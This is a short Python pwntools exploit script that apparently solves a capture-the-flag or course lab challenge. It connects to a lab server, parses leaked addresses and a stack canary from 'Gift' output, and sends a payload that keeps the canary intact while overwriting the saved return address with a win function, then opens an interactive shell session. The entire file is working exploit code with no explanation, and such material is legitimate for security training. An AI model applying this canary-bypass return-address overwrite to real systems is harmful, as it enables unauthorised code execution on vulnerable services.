from pwn import *

# r = process('./lab')
r = remote('10.113.184.121', 10041)

r.recvuntil(b'Gift: 0x')
win_addr = int(r.recvline().strip(), 16) + (0xf1 - 0xe9)
r.recvuntil(b'Gift2: ')
rsp_val = u64(r.recv(0x8))
stack_canary = u64(r.recv(0x8))
rbp_val = u64(r.recv(0x8))
rip = u64(r.recv(0x8))

log.info(f'win address = {hex(win_addr)}')
log.info(f'RSP value = {hex(rsp_val)}')
log.info(f'Stack Canary = {hex(stack_canary)}')
log.info(f'RBP value = {hex(rbp_val)}')
log.info(f'RIP value = {hex(rip)}')

payload = p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr)
log.info(f'Payload = {payload}')
# raw_input()
r.sendline(payload)

r.interactive()